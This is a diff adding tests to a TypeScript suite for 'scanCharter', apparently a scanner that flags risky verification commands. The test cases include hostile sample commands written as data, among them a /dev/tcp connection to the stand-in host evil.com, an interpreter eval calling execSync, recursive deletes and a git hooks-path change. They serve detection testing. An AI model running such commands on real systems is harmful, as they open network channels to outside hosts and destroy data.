@@ -59,6 +59,34 @@ describe("scanCharter", () => {
   });
 });
 
+describe("scanCharter — evasion classes (review H1/H2/M1-M3)", () => {
+  const cases: [string, string, "danger" | "warn"][] = [
+    ["node -e \"require('child_process').execSync('id')\"", "interpreter-eval", "danger"],
+    ["python3 -c 'import os'", "interpreter-eval", "danger"],
+    ["sh ./scripts/evil.sh", "script-exec", "danger"],
+    [". ./x.sh", "script-exec", "danger"],
+    ["exec 3<>/dev/tcp/evil.com/443", "dev-network", "danger"],
+    ["rm --recursive build", "destructive-delete", "danger"],
+    ["find . -name '*.log' -delete", "destructive-delete", "danger"],
+    ["npm ci", "local-install", "warn"],
+    ["yarn", "local-install", "warn"],
+    ["git config core.hooksPath .hooks", "git-hook", "warn"],
+    ["chmod +x ./run", "make-executable", "warn"],
+  ];
+  for (const [cmd, rule, level] of cases) {
+    it(`flags ${rule} for: ${cmd}`, () => {
+      const f = scanCharter(charter({ verify: { commands: [cmd] } }));
+      expect(f.find((x) => x.rule === rule)?.level, cmd).toBe(level);
+    });
+  }
+
+  it("does not mislabel /dev/tcp egress as disk-write (N1)", () => {
+    const f = scanCharter(charter({ verify: { commands: ["exec 3<>/dev/tcp/evil.com/443"] } }));
+    expect(f.some((x) => x.rule === "dev-network")).toBe(true);
+    expect(f.some((x) => x.rule === "disk-write")).toBe(false);
+  });
+});
+
 describe("renderFindings", () => {
   it("labels a clean scan as heuristic, not proof", () => {
     expect(renderFindings([])).toContain("not a safety proof");
